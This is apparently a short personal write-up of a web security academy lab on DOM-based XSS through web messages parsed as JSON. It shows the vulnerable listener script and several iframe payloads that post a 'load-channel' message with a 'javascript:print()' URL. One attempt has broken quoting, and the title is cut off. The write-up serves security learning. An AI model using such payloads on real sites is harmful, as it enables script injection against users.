# DOM XSS using web messages and

## This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function

```javascript
<script>
	window.addEventListener('message', function(e) {
		var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
		document.body.appendChild(iframe);
		try {
			d = JSON.parse(e.data);
		} catch(e) {
			return;
		}
		switch(d.type) {
			case "page-load":
				ACMEplayer.element.scrollIntoView();
				break;
			case "load-channel":
				ACMEplayer.element.src = d.url;
				break;
			case "player-height-changed":
				ACMEplayer.element.style.width = d.width + "px";
				ACMEplayer.element.style.height = d.height + "px";
				break;
		}
	}, false);
</script>
```

### HINT:

```json
{
  "type": "load-channel",
  "url": "javascript:print()"
}
```

### PAYLOAD:

```html
<iframe
  src="https://YOUR-LAB-ID.web-security-academy.net/"
  onload="this.contentWindow.postMessage('javascript:print();/*http:*/','*')"
></iframe>
```

change with hint:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
onload="this.contentWindow.postMessage('{ "type" : "load-channel", "url":
"javascript:print()" }','*')">
```

### PAYLOAD:

rearrange

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/
onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert()\"}","*")'>
```

```html
<iframe
  src="https://0a7e0027045264a7836d2adb00b800b3.web-security-academy.net/"
  onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'
></iframe>
```
